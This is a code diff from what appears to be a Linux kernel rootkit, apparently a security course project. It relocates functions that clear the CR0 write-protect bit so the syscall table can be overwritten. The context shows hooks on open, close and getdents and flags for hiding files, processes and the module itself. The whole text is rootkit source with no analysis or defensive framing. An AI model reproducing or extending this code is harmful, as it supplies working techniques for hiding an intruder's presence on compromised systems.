@@ -29,26 +29,6 @@ unsigned int **syscall_table;
 #define HIDE_PREFIX "cse509--"
 #define BUFSIZE 32768
 
-
-static void make_writeable(void) {
-    unsigned long value;
-    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
-    if (value & 0x00010000) {
-            value &= ~0x00010000;
-            asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
-    }
-}
-
-static void make_non_writeable(void) {
-
-    unsigned long value;
-    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
-    if (!(value & 0x00010000)) {
-            value |= 0x00010000;
-            asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
-    }
-}
-
 struct linux_dirent {
     unsigned long       d_ino;
     unsigned long       d_off;
@@ -67,15 +47,12 @@ struct buffer_struct {
 };
 
 struct buffer_struct buf_struct;
-
 struct hidden_pids_struct hidden_pids;
-
 
 /* pid of the process that has currently opened '/proc/' */
 pid_t proc_open_pid;
 /* fd for opened '/proc/' in this process open_files table */
 int proc_open_fd;
-
 
 u_int8_t module_hidden;
 u_int8_t hide_files_flag;
@@ -92,12 +69,30 @@ u_int8_t hide_files_flag;
 
 /***************************************************************************/
 
-
-
 /* To store a pointer to original close() */
 asmlinkage int (*original_close)(int fd);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage long (*original_open)(const char __user *pathname, int flags, mode_t mode);
+
+static void make_writeable(void) 
+{
+    unsigned long value;
+    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
+    if (value & 0x00010000) {
+        value &= ~0x00010000;
+        asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
+    }
+}
+
+static void make_non_writeable(void) 
+{
+    unsigned long value;
+    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
+    if (!(value & 0x00010000)) {
+        value |= 0x00010000;
+        asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
+    }
+}
 
 int hide_files(void)
 {
@@ -108,6 +103,7 @@ int hide_files(void)
     }
     return err;
 }
+
 int show_files(void)
 {
     int err = 0;
